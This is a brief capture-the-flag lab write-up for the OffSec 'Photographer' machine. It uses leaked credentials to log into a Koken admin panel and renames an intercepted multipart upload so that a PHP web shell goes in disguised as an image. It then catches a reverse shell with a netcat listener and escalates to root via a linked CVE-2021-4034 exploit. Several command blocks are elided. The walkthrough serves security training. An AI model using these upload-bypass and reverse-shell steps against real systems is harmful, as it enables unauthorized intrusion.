###### tags: `Offsec` `PG Play` `Easy` `Linux` # Photographer
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check`mailsent.txt`,can get `daisa@photographer.com`andpassword`babygirl`
```
...
``` Go to `http://192.168.181.76:8000` and perform ffuf
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Go to`http://192.168.181.76:8000/admin`has a `koken`'s loginpage,use`daisa@photographer.com`andpassword`babygirl`login,Refer to[edb-48706](https://www.exploit-db.com/exploits/48706)
Create`image.php.jpg`inside shell.php Click`Import Content`afterstartburpsuite
```
-----------------------------17805986727773904083049195948
Content-Disposition: form-data; name="name"

image.php <------ change to image.php
-----------------------------17805986727773904083049195948
...
none
-----------------------------17805986727773904083049195948
Content-Disposition: form-data; name="file"; filename="image.php" <--- rename
Content-Type: image/jpeg
``` after upload move to the file ![Photographer_1.png](picture/Photographer_1.png) Open nc
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445
``` After copying the URL,,Go to`http://192.168.181.76:8000/content/image/image.php`,wait for reverse shell,in `/home/daisa`can get local.txt
```
...
``` Use [CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py) get root; in /root get proof.txt
```
